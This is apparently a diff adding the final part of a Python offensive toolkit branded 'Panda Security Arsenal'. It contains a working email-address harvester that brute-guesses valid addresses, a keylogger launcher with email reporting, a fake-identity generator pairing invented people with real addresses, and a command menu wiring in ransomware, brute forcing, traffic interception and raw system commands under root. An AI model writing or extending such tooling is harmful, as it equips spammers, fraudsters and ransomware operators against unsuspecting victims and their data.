+		print(f"[ \033[96mM\033[0m ] Harvesting Google Mail ::: Domain(s): \033[93m{'>'.join(domain_list)}\033[0m")
+		saved = 0
+		failed = 0
+		while(1):
+			i = 0
+			username = (f"{names.get_first_name()}{names.get_last_name()}")
+			reverseusername = (f"{names.get_last_name()}{names.get_first_name()}")
+			while(i < len(domain_list)):
+				email = (f"{username}@{domain_list[i]}")
+				is_valid = validate_email(email)
+				if(is_valid):
+					saved = saved + 1
+					print(f"[ \033[96m*\033[0m ] \033[92mVALID\033[0m   [Saved: {saved} | Failed: {failed}] ::: \033[93m{email}\033[0m")
+					with open('harvested_email.txt', 'a') as fileharv:
+						fileharv.write(email + "\n")
+				else:
+					failed = failed + 1
+					print(f"[ \033[96m*\033[0m ] \033[91mINVALID\033[0m [Saved: {saved} | Failed: {failed}] ::: \033[93m{email}\033[0m")
+				i = i +1
+	except TimeoutError:
+		harvemail()
+	
+def keylogger(method = "local"):
+	if method.lower() == "local":
+		keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+	elif method.lower() == "email":
+		keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+	keylogger.start()
+	
+# IDENTITY FORGERY
+
+def forgepeople(number, gender = "all"): # ADD TO HELP
+	if gender.lower() == "male":
+		for i in range(int(number)):
+			print(f"\n[ {i+1} ] Name: {names.get_full_name(gender='male')} | Birthday: {random.randint(1, 12)}/{random.randint(1, 30)}/{random.randint(1980, 2000)} | Address: ", end="")
+			address = real_random_address().items()
+			for k, v in address: print(v, sep=' ', end=', ', flush=True)
+		print("\n")
+	elif gender.lower() == "female":
+		for i in range(int(number)):
+			print(f"\n[ {i+1} ] Name: {names.get_full_name(gender='female')} | Birthday: {random.randint(1, 12)}/{random.randint(1, 30)}/{random.randint(1980, 2000)} | Address: ", end="")
+			address = real_random_address().items()
+			for k, v in address: print(v, sep=' ', end=', ', flush=True)
+		print("\n")
+	else:
+		for i in range(int(number)):
+			print(f"\n[ {i+1} ] Name: {names.get_full_name(gender='all')} | Birthday: {random.randint(1, 12)}/{random.randint(1, 30)}/{random.randint(1980, 2000)} | Address: ", end="")
+			address = real_random_address().items()
+			for k, v in address: print(v, sep=' ', end=', ', flush=True)
+		print("\n")
+	
+# ============== ( OTHER COMMANDS ) =====================
+
+def display(text): print(f"\033[92m{text}\033[0m")
+def katherine(): print("\033[91mI LOVE YOU <3 \033[0m")
+def syscom(command): system(command)
+def restart(): system("clear"), os.execv(sys.executable, ['python'] + sys.argv)
+def clear(): system("clear")
+
+cmdList = {
+					'harvemail':harvemail,
+					'forgepeople': forgepeople,
+					'veremail': veremail,
+					'keylogger':keylogger,
+					'ipinfo':ipinfo,
+					'ipmap':ipmap,
+					'ransomstart':ransomstart,
+					'ransomreverse':ransomreverse,
+					'show':show,
+					'wireshark':wireshark,
+					'intercept':intercept,
+					'phpmonitor':phpmonitor,
+					'pent':pent,
+					'app':app,
+					'help': helpnutri, 
+					'listKey':listKey,
+					'writeKey':writeKey, 
+					'loadKey':loadKey,
+					'removeKey':removeKey,
+					'brute':brute,
+					'encrypt':encrypt, 
+					'encryptd':doubleEncrypt, 
+					'encryptf':fileEncrypt,
+					'encryptr':rEncrypt, # WARNING
+					'encryptmd5':encryptmd5,
+					'decrypt':decrypt, 
+					'decryptd':doubleDecrypt, 
+					'decryptf':fileDecrypt,
+					'decryptr':rDecrypt, # WARNING
+					'display':display,
+					'katherine':katherine,
+					'syscom':syscom,
+					'restart':restart,
+					'clear':clear,
+					'exit':exit
+					}
+
+
+def main():
+	if not os.geteuid() == 0:
+		sys.exit("\033[91m[ PERMISSION DENIED; RUN AS ROOT ]\033[0m")
+	setup()
+	clear()
+	print(ascii_art.header_1)
+	print("\t\t     \033[4mPANDA SECURITY ARSENAL\033[0m")
+	print(f"    \033[93mLEGION ARSENAL ( main, {last_Update_date}, {last_Update_time} ) [ \033[5m{release_mode}\033[0m \033[93m]\033[0m")
+	print(ascii_art.intro)
+	while True:
+		try:
+			cmd = input(f"[ \033[92m*\033[0m ] \033[93m\033[91m$\033[0m ").split("#")
+			cmdList[cmd[0]](*cmd[1:])
+		except IndexError: pass
+		except TypeError: pass
+		except KeyError: pass
+		except KeyboardInterrupt:
+			print("")
+			pass
+		
+if __name__ == "__main__":
+	if sys.argv[1:]:
+		try:
+			cmd = sys.argv[1].split("#")
+			cmdList[cmd[0]](*cmd[1:])
+		except IndexError: helpnutri()
+		except TypeError: helpnutri()
+		except KeyError: helpnutri()
+		except KeyboardInterrupt: helpnutri()
+	else: main()
